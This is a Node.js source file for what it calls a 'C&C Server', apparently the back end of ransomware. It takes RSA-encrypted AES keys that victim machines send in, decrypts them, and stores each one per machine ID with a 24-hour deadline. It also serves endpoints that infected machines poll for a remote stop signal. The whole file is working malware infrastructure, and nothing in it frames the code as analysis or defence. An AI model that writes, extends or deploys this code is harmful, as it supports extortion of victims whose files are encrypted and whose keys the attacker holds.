const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const NodeRSA = require('node-rsa'); // NEW: For RSA Decryption
const app = express();
const PORT = 3000;
const DB_FILE = './database.json';
const PRIV_KEY_FILE = './receiver_private.pem';

app.use(bodyParser.json());

// --- RSA SETUP ---
// Load the private key generated earlier
let rsaKey;
if (fs.existsSync(PRIV_KEY_FILE)) {
    const privateKeyData = fs.readFileSync(PRIV_KEY_FILE, 'utf8');
    rsaKey = new NodeRSA(privateKeyData);
    // Ensure we use the same padding as Python's PKCS1_OAEP
    rsaKey.setOptions({ encryptionScheme: 'pkcs1_oaep' });
    console.log('[SERVER] RSA Private Key loaded for secure handshakes.');
} else {
    console.log('[ERROR] receiver_private.pem NOT FOUND. RSA decryption will fail.');
}

// --- DATABASE PERSISTENCE ---
let machineDatabase = {};
if (fs.existsSync(DB_FILE)) {
    machineDatabase = JSON.parse(fs.readFileSync(DB_FILE));
    console.log('[SERVER] Database loaded from disk.');
}

const saveToDb = () => {
    fs.writeFileSync(DB_FILE, JSON.stringify(machineDatabase, null, 2));
};

// --- ROUTES ---

app.post('/api/receive_key', (req, res) => {
    const { machine_id, encryption_key } = req.body;

    try {
        const encryptedBuffer = Buffer.from(encryption_key, 'base64');

        // CHANGE: Return 'base64' instead of 'utf8'
        const decryptedAesKey = rsaKey.decrypt(encryptedBuffer, 'base64');

        const deadline = new Date();
        deadline.setHours(deadline.getHours() + 24);

        machineDatabase[machine_id] = {
            encryption_key: decryptedAesKey, 
            stop_signal: "0",
            timestamp: new Date().toISOString(),
            deadline: deadline.toISOString()
        };

        saveToDb();
        console.log(`[SERVER] Success! Clean AES Key: ${decryptedAesKey}`);
        res.status(200).json({ status: "success" });
    } catch (err) {
        console.error("[SERVER] RSA Decryption Error:", err.message);
        res.status(500).json({ error: "Decryption failed" });
    }
});

app.post('/api/check_stop_signal', (req, res) => {
    const { machine_id } = req.body;
    const machine = machineDatabase[machine_id];
    if (machine) {
        res.json({ stop_signal: machine.stop_signal, deadline: machine.deadline });
    } else {
        res.json({ stop_signal: "0" });
    }
});

app.post('/api/remote_stop', (req, res) => {
    const { machine_id } = req.body;
    if (machineDatabase[machine_id]) {
        machineDatabase[machine_id].stop_signal = "1";
    } else {
        Object.keys(machineDatabase).forEach(id => machineDatabase[id].stop_signal = "1");
    }
    saveToDb();
    res.json({ status: "success" });
});

app.listen(PORT, () => {
    console.log('--------------------------------------------------');
    console.log(`C&C Server (SECURE MODE) running at http://localhost:${PORT}`);
    console.log('--------------------------------------------------');
});